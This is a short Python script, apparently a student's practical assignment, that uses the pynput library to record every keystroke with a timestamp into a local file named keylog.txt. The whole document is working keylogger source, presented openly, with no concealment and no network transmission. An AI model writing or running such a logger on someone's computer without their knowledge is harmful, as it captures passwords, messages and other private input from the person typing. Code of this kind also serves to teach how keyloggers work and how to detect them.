from pynput.keyboard import Key, Listener
import logging

print("Mohammed Varaliya")
print("TYCS")
print("T109")

logging.basicConfig(filename=("Practical 09\\keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()